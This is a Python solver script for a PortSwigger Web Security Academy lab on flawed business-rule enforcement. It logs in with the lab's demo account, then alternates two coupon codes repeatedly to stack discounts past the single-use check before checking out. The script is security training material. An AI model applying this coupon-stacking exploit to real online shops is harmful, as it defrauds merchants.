# https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules
# Lab: Flawed enforcement of business rules
# Difficulty: APPRENTICE

import urllib3
import requests
from pwn import log
from bs4 import BeautifulSoup

sub = '0aa8002603cb681583c0324b0061004e'
url = f'https://{sub}.web-security-academy.net'

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
s = requests.session()

def get_csrf_token(endpoint):
    log.info(f'Getting CSRF token for {endpoint}')
    r = s.get(f'{url}{endpoint}', verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})
    if csrf:
        return csrf['value']
    log.error("CSRF token not found")
    exit(1)

def login():
    data = {
        'csrf': get_csrf_token('/login'),
        'username': 'wiener',
        'password': 'peter'
    }
    r = s.post(f'{url}/login', data=data, verify=False)
    log.info(f'Logging in as wiener: {r.status_code}')

def add_to_cart():
    data = {
        'productId': 1,
        'redir': 'PRODUCT',
        'quantity': 1
    }
    r = s.post(f'{url}/cart', data=data, verify=False)
    log.info(f'Adding product to cart: {r.status_code}')

def apply_coupon(coupon):
    data = {
        'csrf': get_csrf_token('/cart'),
        'coupon': coupon
    }
    r = s.post(f'{url}/cart/coupon', data=data, verify=False)
    log.info(f'Applying coupon {coupon}: {r.status_code}')

def checkout():
    data = {
        'csrf': get_csrf_token('/cart')
    }
    r = s.post(f'{url}/cart/checkout', data=data, verify=False)
    log.info(f'Checking out: {r.status_code}')

def check_solution():
    r = s.get(f'{url}/cart', verify=False)
    if 'Congratulations, you solved the lab!' in r.text:
        log.success('Lab solved')
    else:
        log.info('Lab not solved yet')

def exploit():
    add_to_cart()

    for i in range(4):
        apply_coupon('SIGNUP30')
        apply_coupon('NEWCUST5')

    checkout()
    check_solution()

if __name__ == '__main__':
    login()
    exploit()